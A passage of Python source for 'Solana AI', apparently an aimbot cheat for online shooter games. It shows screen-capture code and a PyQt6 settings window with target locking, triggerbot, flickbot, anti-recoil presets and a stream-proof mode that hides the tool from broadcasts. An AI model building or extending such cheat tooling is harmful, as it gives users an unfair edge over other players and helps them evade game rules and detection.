            if "RTX" in clean_name:
                parts = clean_name.split()
                rtx_index = next(i for i, part in enumerate(parts) if "RTX" in part)
                if rtx_index + 1 < len(parts):
                    model = parts[rtx_index + 1]
                    if rtx_index + 2 < len(parts) and parts[rtx_index + 2] in ["Ti", "SUPER"]:
                        model += f" {parts[rtx_index + 2]}"
                    return f"RTX-{model.replace(' ', '')}"
            elif "GTX" in clean_name:
                parts = clean_name.split()
                gtx_index = next(i for i, part in enumerate(parts) if "GTX" in part)
                if gtx_index + 1 < len(parts):
                    model = parts[gtx_index + 1]
                    if gtx_index + 2 < len(parts) and parts[gtx_index + 2] in ["Ti", "SUPER"]:
                        model += f" {parts[gtx_index + 2]}"
                    return f"GTX-{model.replace(' ', '')}"
            
            return "NVIDIA-GPU"
        except:
            return "NVIDIA-GPU"
    
    def update_region(self, fov, left, top):
        """Update capture region"""
        self.fov = fov
        self.left = left
        self.top = top
    
    def grab(self):
        """Grab frame with GPU acceleration"""
        try:
            # Get latest frame from bettercam
            cpu_frame = self.cam.get_latest_frame()
            
            if cpu_frame is not None:
                # Initialize GPU buffer on first frame
                if not self.gpu_initialized:
                    self.gpu_buffer = cp.asarray(cpu_frame)
                    self.gpu_initialized = True
                
                # Fast GPU enhancement
                cp.copyto(self.gpu_buffer, cp.asarray(cpu_frame))
                enhanced = self.gpu_buffer.astype(cp.float32) * 1.001
                result = cp.clip(enhanced, 0, 255).astype(cp.uint8)
                
                # Return CPU frame for compatibility
                final_frame = cp.asnumpy(result)
                
                # Crop to FOV if needed
                if final_frame.shape[0] > self.fov or final_frame.shape[1] > self.fov:
                    center_x = final_frame.shape[1] // 2
                    center_y = final_frame.shape[0] // 2
                    half_fov = self.fov // 2
                    
                    y1 = max(0, center_y - half_fov)
                    y2 = min(final_frame.shape[0], center_y + half_fov)
                    x1 = max(0, center_x - half_fov)
                    x2 = min(final_frame.shape[1], center_x + half_fov)
                    
                    final_frame = final_frame[y1:y2, x1:x2]
                
                return final_frame
            
            return None
            
        except Exception as e:
            print(f"[-] Capture error: {e}")
            return None
    
    def release(self):
        """Release capture resources"""
        try:
            self.cam.stop()
            self.running = False
        except:
            pass



class ConfigApp(QMainWindow):
    def __init__(self):

        super().__init__()
        # Initialize icon manager FIRST
        self.icon_manager = IconManager("icons")  # Assumes icons folder in same directory

        self.setWindowTitle("Solana AI")
        self.setGeometry(100, 100, 920, 680)
        self.setWindowFlags(Qt.WindowType.FramelessWindowHint)
        #self.setAttribute(Qt.WidgetAttribute.WA_TranslucentBackground)

        self.config_manager = ConfigManager(CONFIG_PATH)
        self.aimbot_controller = AimbotController(self.config_manager)
        self.config_data = self.config_manager.get_config()
        self.aimbot_controller.config_app_reference = self

        # Set application icon
        app_icon = self.icon_manager.get_icon('app_icon')
        if app_icon:
            self.setWindowIcon(app_icon)

        # Add stream-proof manager
        self.stream_proof = StreamProofManager()

        # Register this window with stream-proof manager
        self.stream_proof.register_qt_window(self)

        # Add this for menu toggle
        self.is_hidden = False

        # Initialize status tracking
        self.stream_proof_enabled = False

        # Start hotkey listener
        self.start_hotkey_listener()

        # Model reload thread
        self.model_reload_thread = None

        # Main container with electron-style background
        self.central_widget = QWidget()
        self.setCentralWidget(self.central_widget)
        
        # Apply Electron-like styling without transparency issues
        self.central_widget.setStyleSheet("""
            QWidget#central_widget {
                background-color: #1e1e1e;
                border: none;
            }
        """)

        # Add this line right after setting the stylesheet:
        self.central_widget.setObjectName("central_widget")

        # Add drop shadow effect for depth
        #self.setAttribute(Qt.WidgetAttribute.WA_TranslucentBackground)
        self.setup_shadow_effect()

        # Main layout
        main_layout = QVBoxLayout(self.central_widget)
        main_layout.setContentsMargins(0, 0, 0, 0)
        main_layout.setSpacing(0)

        # Create title bar
        self.create_title_bar(main_layout)

        # Create main content area
        content_container = QWidget()
        content_container.setStyleSheet("border: none;")
        content_layout = QHBoxLayout(content_container)
        content_layout.setContentsMargins(0, 0, 0, 0)
        content_layout.setSpacing(0)

        # Create navigation
        self.create_navigation(content_layout)

        # Create content area
        self.content_area = QWidget()
        self.content_area.setStyleSheet("""
            QWidget {
                background-color: #252526;
                border: none;
                border-left: 1px solid #2d2d2d;
            }
        """)
        content_layout.addWidget(self.content_area, 1)

        self.content_layout = QVBoxLayout(self.content_area)
        self.content_layout.setContentsMargins(32, 24, 32, 24)

        main_layout.addWidget(content_container)

        # Create tab contents
        self.create_tab_contents()
        self.show_tab(0)

        # Setup real-time updates
        self.setup_real_time_updates()

        # Disable scroll on all widgets
        self.disable_scroll_on_all_widgets()

    def setup_shadow_effect(self):
        """Add shadow effect to the main window"""
        from PyQt6.QtWidgets import QGraphicsDropShadowEffect
    
        shadow = QGraphicsDropShadowEffect()
        shadow.setBlurRadius(20)
        shadow.setXOffset(0)
        shadow.setYOffset(0)
        shadow.setColor(QColor(0, 122, 204, 80))  # Accent color with transparency
        self.central_widget.setGraphicsEffect(shadow)

    def create_title_bar(self, main_layout):
        """Create custom title bar with Electron style"""
        title_bar = QWidget()
        title_bar.setFixedHeight(32)
        title_bar.setStyleSheet("""
            QWidget {
                background: qlineargradient(x1: 0, y1: 0, x2: 0, y2: 1,
                    stop: 0 #2d2d2d, stop: 1 #252526);
                border: none;
                border-bottom: 2px solid #007acc;
                border-top-left-radius: 10px;
                border-top-right-radius: 10px;
            }
        """)
        
        title_layout = QHBoxLayout(title_bar)
        title_layout.setContentsMargins(12, 0, 8, 0)
        title_layout.setSpacing(8)

        # Window controls (macOS style)
        controls_widget = QWidget()
        controls_layout = QHBoxLayout(controls_widget)
        controls_layout.setContentsMargins(0, 0, 0, 0)
        controls_layout.setSpacing(8)

        # Close button
        close_btn = QPushButton()
        close_btn.setFixedSize(12, 12)
        close_btn.setStyleSheet("""
            QPushButton {
                background-color: #ff5f57;
                border: 1px solid #e0443e;
                border-radius: 7px;
            }
            QPushButton:hover {
                background-color: #ff3b30;
                border: 1px solid #ff1500;
            }
        """)
        close_btn.clicked.connect(self.close_application)

        # Minimize button
        min_btn = QPushButton()
        min_btn.setFixedSize(12, 12)
        min_btn.setStyleSheet("""
            QPushButton {
                background-color: #ffbd2e;
                border: 1px solid #dea123;
                border-radius: 7px;
            }
            QPushButton:hover {
                background-color: #ffaa00;
                border: 1px solid #ff9500;
            }
        """)
        min_btn.clicked.connect(self.showMinimized)

        # Maximize button (disabled)
        max_btn = QPushButton()
        max_btn.setFixedSize(12, 12)
        max_btn.setStyleSheet("""
            QPushButton {
                background-color: #28ca42;
                border: 1px solid #1aad2f;
                border-radius: 7px;
            }
            QPushButton:hover {
                background-color: #1fb934;
                border: 1px solid #0fa020;
            }
        """)

        controls_layout.addWidget(close_btn)
        controls_layout.addWidget(min_btn)
        controls_layout.addWidget(max_btn)
        title_layout.addWidget(controls_widget)

        # Title
        title_label = QLabel("Solana AI")
        title_label.setStyleSheet("""
            color: #ffffff;
            font-size: 14px;
            font-weight: 600;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        """)
        title_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        title_layout.addWidget(title_label, 1)

        # Spacer for symmetry
        spacer = QWidget()
        spacer.setFixedWidth(36)
        title_layout.addWidget(spacer)

        main_layout.addWidget(title_bar)
        
        # Make title bar draggable
        title_bar.mousePressEvent = self.mousePressEvent
        title_bar.mouseMoveEvent = self.mouseMoveEvent

    def create_navigation(self, layout):
        """Create VS Code style navigation sidebar with custom icons"""
        nav = QWidget()
        nav.setFixedWidth(240)
        nav.setStyleSheet("""
            QWidget {
                background-color: #252526;
                border: none;
                border-right: 2px solid #3e3e3e;
            }
        """)
    
        nav_layout = QVBoxLayout(nav)
        nav_layout.setContentsMargins(0, 0, 0, 0)
        nav_layout.setSpacing(0)

        # Navigation header
        header = QLabel("CONFIGURATION")
        header.setStyleSheet("""
            padding: 16px 24px 8px 24px;
            color: #858585;
            font-size: 11px;
            font-weight: 600;
            letter-spacing: 0.05em;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        """)
        nav_layout.addWidget(header)

        # Navigation items with icon keys (using icon keys instead of emojis)
        self.nav_buttons = []
        nav_items = [
            ("General", "general"),
            ("Target", "target"),
            ("Display", "display"),
            ("Performance", "performance"),
            ("Models", "models"),
            ("Advanced", "advanced"),
            ("RCS", "rcs"),
            ("Triggerbot", "triggerbot"),
            ("Flickbot", "flickbot"),
            ("Controller", "controller"),
            ("Hotkeys", "hotkeys"),
            ("About", "about")
        ]

        for i, (name, icon_key) in enumerate(nav_items):
            btn = self.create_nav_button_with_icon(name, icon_key)
            btn.clicked.connect(lambda checked, index=i: self.show_tab(index))
            nav_layout.addWidget(btn)
            self.nav_buttons.append(btn)

        # Set first button as active
        self.nav_buttons[0].setProperty("active", True)
        self.nav_buttons[0].style().unpolish(self.nav_buttons[0])
        self.nav_buttons[0].style().polish(self.nav_buttons[0])

        nav_layout.addStretch()

        # Bottom section
        bottom_section = QWidget()
        bottom_layout = QVBoxLayout(bottom_section)
        bottom_layout.setContentsMargins(24, 16, 24, 24)
        bottom_layout.setSpacing(12)

        # Status indicator with custom icon or fallback to dot
        status_widget = QWidget()
        status_layout = QHBoxLayout(status_widget)
        status_layout.setContentsMargins(0, 0, 0, 0)
        status_layout.setSpacing(8)

        # Try to use custom icon, fallback to dot if not available
        if hasattr(self, 'icon_manager'):
            status_icon_pixmap = self.icon_manager.get_pixmap('status_ready', (12, 12))
            if status_icon_pixmap:
                self.status_icon = QLabel()
                self.status_icon.setPixmap(status_icon_pixmap)
                self.status_icon.setFixedSize(12, 12)
                status_layout.addWidget(self.status_icon)
            else:
                # Fallback to dot
                self.status_dot = QLabel("●")
                self.status_dot.setStyleSheet("color: #4caf50; font-size: 10px;")
                status_layout.addWidget(self.status_dot)
        else:
            # Fallback to dot
            self.status_dot = QLabel("●")
            self.status_dot.setStyleSheet("color: #4caf50; font-size: 10px;")
            status_layout.addWidget(self.status_dot)

        self.status_label = QLabel("Ready")
        self.status_label.setStyleSheet("""
            color: #858585;
            font-size: 12px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        """)
        status_layout.addWidget(self.status_label)
        status_layout.addStretch()

        bottom_layout.addWidget(status_widget)

        # Action buttons with icons
        self.run_button = self.create_action_button_with_icon("Start", "#007acc", "#005a9e", "start")
        self.run_button.clicked.connect(self.toggle_aimbot)
        bottom_layout.addWidget(self.run_button)

        exit_button = self.create_action_button_with_icon("Exit", "#3e3e3e", "#2d2d2d", "exit")
        exit_button.clicked.connect(self.stop_and_exit)
        bottom_layout.addWidget(exit_button)

        nav_layout.addWidget(bottom_section)
        layout.addWidget(nav)

    def create_action_button_with_icon(self, text, bg_color, hover_color, icon_key=None):
        """Create action button with custom icon"""
        btn = QPushButton(text)
        btn.setCursor(Qt.CursorShape.PointingHandCursor)
    
        # Set icon if provided and icon manager exists
        if icon_key and hasattr(self, 'icon_manager'):
            icon = self.icon_manager.get_icon(icon_key, (16, 16))
            if icon:
                btn.setIcon(icon)
                btn.setIconSize(QSize(16, 16))
    
        btn.setStyleSheet(f"""
            QPushButton {{
                background: qlineargradient(x1: 0, y1: 0, x2: 0, y2: 1,
                    stop: 0 {bg_color}, stop: 0.5 {bg_color}, stop: 1 {hover_color});
                border: 2px solid {hover_color};
                color: white;
                padding: 10px 18px;
                border-radius: 6px;
                font-size: 13px;
                font-weight: 600;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            }}
            QPushButton:hover {{
                background: qlineargradient(x1: 0, y1: 0, x2: 0, y2: 1,
                    stop: 0 {hover_color}, stop: 1 {bg_color});
                border: 2px solid #00d4ff;
            }}
            QPushButton:pressed {{
                background: {hover_color};
                border: 2px solid {bg_color};
                padding: 11px 18px 9px 18px;
            }}
        """)
        return btn

    def create_nav_button_with_icon(self, text, icon_key):
        """Create navigation button with custom icon"""
        btn = QPushButton()
        btn.setProperty("active", False)
        btn.setCursor(Qt.CursorShape.PointingHandCursor)
    
        # Set icon
        icon = self.icon_manager.get_icon(icon_key, (16, 16))
        if icon:
            btn.setIcon(icon)
            btn.setIconSize(QSize(16, 16))
            btn.setText(f"  {text}")  # Add spacing after icon
        else:
            btn.setText(text)  # Fallback to text only
    
        btn.setStyleSheet("""
            QPushButton {
                background-color: transparent;
                border: none;
                border-left: 3px solid transparent;
                color: #cccccc;
                text-align: left;
                padding: 10px 24px;
                font-size: 13px;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            }
            QPushButton:hover {
                background-color: rgba(42, 45, 46, 0.8);
                border-left: 3px solid #007acc;
                color: #ffffff;
            }
            QPushButton[active="true"] {
                background-color: #37373d;
                color: white;
                border-left: 3px solid #007acc;
            }
        """)
        return btn


    def create_navigation_with_icons(self, layout):
        """Modified navigation creation with custom icons"""
        nav = QWidget()
        nav.setFixedWidth(240)
        nav.setStyleSheet("""
            QWidget {
                background-color: #252526;
                border: none;
            }
        """)
    
        nav_layout = QVBoxLayout(nav)
        nav_layout.setContentsMargins(0, 0, 0, 0)
        nav_layout.setSpacing(0)
    
        # Navigation header
        header = QLabel("CONFIGURATION")
        header.setStyleSheet("""
            padding: 16px 24px 8px 24px;
            color: #858585;
            font-size: 11px;
            font-weight: 600;
            letter-spacing: 0.05em;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        """)
        nav_layout.addWidget(header)
    
        # Navigation items with icon keys
        self.nav_buttons = []
        nav_items = [
            ("General", "general"),
            ("Target", "target"),
            ("Display", "display"),
            ("Performance", "performance"),
            ("Models", "models"),
            ("Advanced", "advanced"),
            ("RCS", "rcs"),
            ("Triggerbot", "triggerbot"),
            ("Flickbot", "flickbot"),
            ("Controller", "controller"),
            ("Hotkeys", "hotkeys"),
            ("About", "about")
        ]
    
        for i, (name, icon_key) in enumerate(nav_items):
            btn = self.create_nav_button_with_icon(name, icon_key)
            btn.clicked.connect(lambda checked, index=i: self.show_tab(index))
            nav_layout.addWidget(btn)
            self.nav_buttons.append(btn)
    
        # Set first button as active
        self.nav_buttons[0].setProperty("active", True)
        self.nav_buttons[0].style().unpolish(self.nav_buttons[0])
        self.nav_buttons[0].style().polish(self.nav_buttons[0])
    
        nav_layout.addStretch()
    
        # Bottom section with status icon
        bottom_section = QWidget()
        bottom_layout = QVBoxLayout(bottom_section)
        bottom_layout.setContentsMargins(24, 16, 24, 24)
        bottom_layout.setSpacing(12)
    
        # Status indicator with custom icon
        status_widget = QWidget()
        status_layout = QHBoxLayout(status_widget)
        status_layout.setContentsMargins(0, 0, 0, 0)
        status_layout.setSpacing(8)
    
        # Use custom status icon instead of dot
        self.status_icon = self.icon_manager.create_icon_label('status_ready', (12, 12))
        status_layout.addWidget(self.status_icon)
    
        self.status_label = QLabel("Ready")
        self.status_label.setStyleSheet("""
            color: #858585;
            font-size: 12px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        """)
        status_layout.addWidget(self.status_label)
        status_layout.addStretch()
    
        bottom_layout.addWidget(status_widget)
    
        # Action buttons with icons
        self.run_button = self.create_action_button_with_icon("Start", "#007acc", "#005a9e", "start")
        self.run_button.clicked.connect(self.toggle_aimbot)
        bottom_layout.addWidget(self.run_button)
    
        exit_button = self.create_action_button_with_icon("Exit", "#3e3e3e", "#2d2d2d", "exit")
        exit_button.clicked.connect(self.stop_and_exit)
        bottom_layout.addWidget(exit_button)
    
        nav_layout.addWidget(bottom_section)
        layout.addWidget(nav)

    def create_nav_button(self, text, icon):
        """Create navigation button with hover effect"""
        btn = QPushButton(f"{icon}  {text}")
        btn.setProperty("active", False)
        btn.setCursor(Qt.CursorShape.PointingHandCursor)
        btn.setStyleSheet("""
            QPushButton {
                background-color: transparent;
                border: none;
                color: #cccccc;
                text-align: left;
                padding: 10px 24px;
                font-size: 13px;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            }
            QPushButton:hover {
                background-color: #2a2d2e;
            }
            QPushButton[active="true"] {
                background-color: #37373d;
                color: white;
                border-left: 2px solid #007acc;
            }
        """)
        return btn

    def create_action_button(self, text, bg_color, hover_color):
        """Create action button with modern styling"""
        btn = QPushButton(text)
        btn.setCursor(Qt.CursorShape.PointingHandCursor)
        btn.setStyleSheet(f"""
            QPushButton {{
                background: qlineargradient(x1: 0, y1: 0, x2: 0, y2: 1,
                    stop: 0 {bg_color}, stop: 0.5 {bg_color}, stop: 1 {hover_color});
                border: 2px solid {hover_color};
                color: white;
                padding: 10px 18px;
                border-radius: 6px;
                font-size: 13px;
                font-weight: 600;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            }}
            QPushButton:hover {{
                background: qlineargradient(x1: 0, y1: 0, x2: 0, y2: 1,
                    stop: 0 {hover_color}, stop: 1 {bg_color});
                border: 2px solid #00d4ff;
            }}
            QPushButton:pressed {{
                background: {hover_color};
                border: 2px solid {bg_color};
                padding: 11px 18px 9px 18px;
            }}
        """)
        return btn

    def create_tab_contents(self):
        """Create content for each tab"""
        self.tab_contents = []
        
        # Tab 0: General Settings
        general_widget = self.create_section_widget()
        self.create_general_content(general_widget.layout())
        self.tab_contents.append(general_widget)

        # Tab 1: Target Settings (NEW)
        target_widget = self.create_section_widget()
        self.create_target_content(target_widget.layout())
        self.tab_contents.append(target_widget)
        
        # Tab 1: Display Settings
        display_widget = self.create_section_widget()
        self.create_display_content(display_widget.layout())
        self.tab_contents.append(display_widget)
        
        # Tab 2: Performance Settings
        performance_widget = self.create_section_widget()
        self.create_performance_content(performance_widget.layout())
        self.tab_contents.append(performance_widget)

        models_widget = self.create_section_widget()
        self.create_models_content(models_widget.layout())
        self.tab_contents.append(models_widget)
        
        # Tab 3: Advanced Settings
        advanced_widget = self.create_section_widget()
        self.create_advanced_content(advanced_widget.layout())
        self.tab_contents.append(advanced_widget)

        # Tab 5: Anti-Recoil Settings (NEW)
        antirecoil_widget = self.create_section_widget()
        self.create_antirecoil_content(antirecoil_widget.layout())
        self.tab_contents.append(antirecoil_widget)

        # Tab 6: Triggerbot (NEW - Separate)
        triggerbot_widget = self.create_section_widget()
        self.create_triggerbot_content(triggerbot_widget.layout())
        self.tab_contents.append(triggerbot_widget)

        # Tab 7: Flickbot (NEW - Separate)
        flickbot_widget = self.create_section_widget()
        self.create_flickbot_content(flickbot_widget.layout())
        self.tab_contents.append(flickbot_widget)

        # Tab 8: Controller (NEW)
        controller_widget = self.create_section_widget()
        self.create_controller_content(controller_widget.layout())
        self.tab_contents.append(controller_widget)

        hotkeys_widget = self.create_section_widget()
        self.create_hotkeys_content(hotkeys_widget.layout())
        self.tab_contents.append(hotkeys_widget)
        
        # Tab 4: About
        about_widget = self.create_section_widget()
        self.create_about_content(about_widget.layout())
        self.tab_contents.append(about_widget)
        
        # Add all tabs to content layout
        for widget in self.tab_contents:
            widget.setVisible(False)
            self.content_layout.addWidget(widget)

    def create_antirecoil_content(self, layout):
        """Anti-Recoil settings tab with smart activation"""
        layout.addWidget(self.create_section_title("Anti-Recoil"))
        layout.addWidget(self.create_section_description("Smart recoil compensation that activates only when aiming"))

        # Get current anti-recoil config
        anti_recoil_config = self.config_data.get('anti_recoil', {
            'enabled': False,
            'strength': 5.0,
            'reduce_bloom': True,
            'require_target': True,
            'require_keybind': True
        })

        # Main settings group
        recoil_group = self.create_settings_group()
        recoil_container = QWidget()
        recoil_layout = QVBoxLayout(recoil_container)
        recoil_layout.setContentsMargins(0, 0, 0, 0)
        recoil_layout.setSpacing(20)
    
        recoil_layout.addWidget(self.create_group_label("Recoil Control"))
    
        # Enable checkbox
        self.anti_recoil_enabled_cb = self.create_modern_checkbox(
            "Enable Anti-Recoil",
            anti_recoil_config.get('enabled', False)
        )
        recoil_layout.addWidget(self.anti_recoil_enabled_cb)
    
        # Description
        recoil_desc = QLabel("Smart anti-recoil that only activates when you're actually aiming at enemies")
        recoil_desc.setStyleSheet("""
            color: #858585;
            font-size: 12px;
            margin-top: 4px;
            margin-left: 26px;
            margin-bottom: 16px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        """)
        recoil_desc.setWordWrap(True)
        recoil_layout.addWidget(recoil_desc)
    
        # Strength slider
        anti_recoil_strength = int(anti_recoil_config.get('strength', 5.0))
        self.anti_recoil_strength_slider = self.create_modern_slider(
            recoil_layout,
            "Recoil Compensation Strength",
            anti_recoil_strength,
            0,
            20,
            ""
        )
    
        # Reduce bloom checkbox
        self.anti_recoil_bloom_cb = self.create_modern_checkbox(
            "Reduce Horizontal Bloom",
            anti_recoil_config.get('reduce_bloom', True)
        )
        recoil_layout.addWidget(self.anti_recoil_bloom_cb)
    
        layout.addWidget(recoil_container)

        # Activation Settings Group
        activation_group = self.create_settings_group()
        activation_container = QWidget()
        activation_layout = QVBoxLayout(activation_container)
        activation_layout.setContentsMargins(0, 0, 0, 0)
        activation_layout.setSpacing(12)
    
        activation_layout.addWidget(self.create_group_label("Activation Requirements"))
    
        # Require target checkbox
        self.require_target_cb = self.create_modern_checkbox(
            "Only activate when target is detected",
            anti_recoil_config.get('require_target', True)
        )
        activation_layout.addWidget(self.require_target_cb)
    
        # Require keybind checkbox
        self.require_keybind_cb = self.create_modern_checkbox(
            "Only activate when aimbot key is pressed",
            anti_recoil_config.get('require_keybind', True)
        )
        activation_layout.addWidget(self.require_keybind_cb)
    
        # Activation info
        activation_info = QLabel("With both options enabled, anti-recoil only works when:\n• A target is detected by the AI\n• Your aimbot keybind is pressed\n• You're firing (left mouse)")
        activation_info.setStyleSheet("""
            color: #4caf50;
            font-size: 12px;
            margin-top: 8px;
            padding: 12px;
            background-color: #1e1e1e;
            border: 1px solid #4caf50;
            border-radius: 4px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        """)
        activation_info.setWordWrap(True)
        activation_layout.addWidget(activation_info)
    
        layout.addWidget(activation_container)

        # Weapon Presets Group (same as before)
        presets_group = self.create_settings_group()
        presets_container = QWidget()
        presets_layout = QVBoxLayout(presets_container)
        presets_layout.setContentsMargins(0, 0, 0, 0)
        presets_layout.setSpacing(12)
    
        presets_layout.addWidget(self.create_group_label("Weapon Presets"))
    
        # Preset buttons
        preset_buttons_layout = QHBoxLayout()
        preset_buttons_layout.setSpacing(8)
    
        # Create weapon preset buttons
        self.smg_preset_btn = self.create_preset_button("SMG", "#4caf50")
        self.smg_preset_btn.clicked.connect(lambda: self.apply_recoil_preset('smg'))
        preset_buttons_layout.addWidget(self.smg_preset_btn)
    
        self.ar_preset_btn = self.create_preset_button("Assault Rifle", "#2196f3")
        self.ar_preset_btn.clicked.connect(lambda: self.apply_recoil_preset('ar'))
        preset_buttons_layout.addWidget(self.ar_preset_btn)
    
        self.lmg_preset_btn = self.create_preset_button("LMG", "#ff9800")
        self.lmg_preset_btn.clicked.connect(lambda: self.apply_recoil_preset('lmg'))
        preset_buttons_layout.addWidget(self.lmg_preset_btn)
    
        self.sniper_preset_btn = self.create_preset_button("Sniper", "#9c27b0")
        self.sniper_preset_btn.clicked.connect(lambda: self.apply_recoil_preset('sniper'))
        preset_buttons_layout.addWidget(self.sniper_preset_btn)
    
        presets_layout.addLayout(preset_buttons_layout)
    
        # Preset description
        self.recoil_preset_desc = QLabel("SMG: Low recoil compensation (3-5 strength)")
        self.recoil_preset_desc.setStyleSheet("""
            color: #858585;
            font-size: 12px;
            margin-top: 8px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        """)
        self.recoil_preset_desc.setWordWrap(True)
        presets_layout.addWidget(self.recoil_preset_desc)
    
        layout.addWidget(presets_container)
    
        layout.addStretch()

    def apply_recoil_preset(self, preset):
        """Apply weapon-specific recoil presets"""
        presets = {
            'smg': {
                'strength': 4,
                'bloom': True,
                'description': 'SMG: Low recoil compensation (3-5 strength)'
            },
            'ar': {
                'strength': 7,
                'bloom': True,
                'description': 'Assault Rifle: Medium recoil compensation (5-8 strength)'
            },
            'lmg': {
                'strength': 10,
                'bloom': True,
                'description': 'LMG: High recoil compensation (8-12 strength)'
            },
            'sniper': {
                'strength': 2,
                'bloom': False,
                'description': 'Sniper: Minimal recoil compensation (1-3 strength)'
            }
        }
    
        if preset in presets:
            settings = presets[preset]
        
            # Apply settings to UI
            self.anti_recoil_strength_slider.setValue(settings['strength'])
            self.anti_recoil_bloom_cb.setChecked(settings['bloom'])
        
            # Update description
            self.recoil_preset_desc.setText(settings['description'])
        
            # Enable anti-recoil
            self.anti_recoil_enabled_cb.setChecked(True)
        
            # Visual feedback
            self.status_label.setText(f"Applied {preset.upper()} preset")
            self.status_dot.setStyleSheet("color: #4caf50; font-size: 10px;")
            QTimer.singleShot(2000, self.reset_status_label)

    def create_target_content(self, layout):
        """Target settings tab - All targeting and locking configurations"""
        layout.addWidget(self.create_section_title("Target"))
        layout.addWidget(self.create_section_description("Configure target detection, selection, and locking behavior"))

        # Create scroll area for better organization
        scroll_area = QScrollArea()
        scroll_area.setWidgetResizable(True)
        scroll_area.setHorizontalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOff)
        scroll_area.setStyleSheet("""
            QScrollArea {
                background-color: transparent;
                border: none;
            }
            QScrollBar:vertical {
                background-color: #2d2d2d;
                width: 12px;
                border-radius: 6px;
            }
            QScrollBar::handle:vertical {
                background-color: #3e3e3e;
                border-radius: 6px;
                min-height: 20px;
            }
            QScrollBar::handle:vertical:hover {
                background-color: #4a4a4a;
            }
            QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical {
                border: none;
                background: none;
            }
        """)

        # Create container widget for scroll content
        scroll_content = QWidget()
        scroll_content.setStyleSheet("background-color: transparent;")
        scroll_layout = QVBoxLayout(scroll_content)
        scroll_layout.setContentsMargins(0, 0, 12, 0)
        scroll_layout.setSpacing(24)

        # Get current configs
        target_lock_config = self.config_data.get('target_lock', {
            'enabled': True,
            'min_lock_duration': 0.5,
            'max_lock_duration': 3.0,
            'distance_threshold': 100,
            'reacquire_timeout': 0.3,
            'smart_switching': True,
            'preference': 'closest'
        })

        # ============= TARGET LOCKING =============
        lock_group = self.create_settings_group()
        lock_container = QWidget()
        lock_layout = QVBoxLayout(lock_container)
        lock_layout.setContentsMargins(0, 0, 0, 0)
        lock_layout.setSpacing(16)
    
        lock_layout.addWidget(self.create_group_label("Target Locking"))
    
        # Enable target lock checkbox
        self.target_lock_enabled_cb = self.create_modern_checkbox(
            "Enable Target Locking",
            target_lock_config.get('enabled', True)
        )
        lock_layout.addWidget(self.target_lock_enabled_cb)
    
        # Description
        lock_desc = QLabel("Prevents rapid target switching by locking onto one target until eliminated or lost")
        lock_desc.setStyleSheet("""
            color: #858585;
            font-size: 12px;
            margin-top: 4px;
            margin-left: 26px;
            margin-bottom: 12px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        """)
        lock_desc.setWordWrap(True)
        lock_layout.addWidget(lock_desc)
    
        # Min lock duration
        min_lock = int(target_lock_config.get('min_lock_duration', 0.5) * 1000)
        self.min_lock_slider = self.create_modern_slider(
            lock_layout,
            "Minimum Lock Duration",
            min_lock,
            100,
            2000,
            "ms",
            0.001
        )
    
        # Max lock duration
        max_lock = int(target_lock_config.get('max_lock_duration', 3.0) * 1000)
        self.max_lock_slider = self.create_modern_slider(
            lock_layout,
            "Maximum Lock Duration",
            max_lock,
            1000,
            8000,
            "ms",
            0.001
        )
    
        # Lock break distance
        distance_threshold = int(target_lock_config.get('distance_threshold', 100))
        self.distance_threshold_slider = self.create_modern_slider(
            lock_layout,
            "Lock Break Distance",
            distance_threshold,
            50,
            300,
            "px"
        )
    
        # Reacquire timeout
        reacquire_timeout = int(target_lock_config.get('reacquire_timeout', 0.3) * 1000)
        self.reacquire_timeout_slider = self.create_modern_slider(
            lock_layout,
            "Target Lost Timeout",
            reacquire_timeout,
            100,
            8000,
            "ms",
            0.001
        )
    
        scroll_layout.addWidget(lock_container)

        # ============= TARGET SELECTION =============
        selection_group = self.create_settings_group()
        selection_container = QWidget()
        selection_layout = QVBoxLayout(selection_container)
        selection_layout.setContentsMargins(0, 0, 0, 0)
        selection_layout.setSpacing(16)
    
        selection_layout.addWidget(self.create_group_label("Target Selection"))
    
        # Smart switching
        self.smart_switching_cb = self.create_modern_checkbox(
            "Smart Target Switching (Prioritize threats)",
            target_lock_config.get('smart_switching', True)
        )
        selection_layout.addWidget(self.smart_switching_cb)
    
        # Target preference
        preference_label = QLabel("Target Priority:")
        preference_label.setStyleSheet("""
            color: #cccccc;
            font-size: 13px;
            margin-top: 12px;
            margin-bottom: 4px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        """)
        selection_layout.addWidget(preference_label)
    
        self.target_preference_combo = NoScrollComboBox()
        self.target_preference_combo.setCursor(Qt.CursorShape.PointingHandCursor)
        self.target_preference_combo.setStyleSheet(self.get_combo_style())
        self.target_preference_combo.setStyleSheet("""
            QComboBox {
                background-color: #3e3e3e;
                border: 1px solid #3e3e3e;
                border-radius: 4px;
                padding: 8px 12px;
                color: #cccccc;
                font-size: 13px;
                min-width: 200px;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            }
            QComboBox:hover {
                border-color: #555;
            }
            QComboBox:focus {
                border-color: #007acc;
            }
            QComboBox::drop-down {
                border: none;
                width: 20px;
            }
            QComboBox::down-arrow {
                image: none;
                width: 0;
                height: 0;
                border-left: 4px solid transparent;
                border-right: 4px solid transparent;
                border-top: 5px solid #858585;
                margin-right: 8px;
            }
            QComboBox QAbstractItemView {
                background-color: #2d2d2d;
